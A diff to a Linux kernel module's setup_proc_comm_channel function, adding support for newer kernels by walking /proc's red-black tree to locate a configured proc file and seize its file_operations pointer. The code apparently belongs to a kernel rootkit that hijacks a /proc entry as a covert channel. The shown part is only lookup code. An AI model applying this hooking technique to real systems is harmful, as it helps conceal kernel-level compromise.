@@ -1136,8 +1136,32 @@ int setup_proc_comm_channel(void)
 
         proc_entry = proc_entry->next;
     }
-
 	
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0)
+
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0) || \
+    	LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
+    struct rb_node *entry = rb_first(&proc_entry->subdir);
+    #elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 14, 0) && \
+    	LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+    struct rb_node *entry = rb_first(&proc_entry->subdir.rb_root);
+    #endif
+
+    while (entry) {
+        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
+
+        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0) {
+            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+            goto found;
+        }
+
+        entry = rb_next(entry);
+    }
+	
+#endif
+
+/*
 #elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 19, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 14, 0)
 
@@ -1189,7 +1213,7 @@ int setup_proc_comm_channel(void)
     }
 
 #endif
-
+*/
     pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);
 
     return 0;
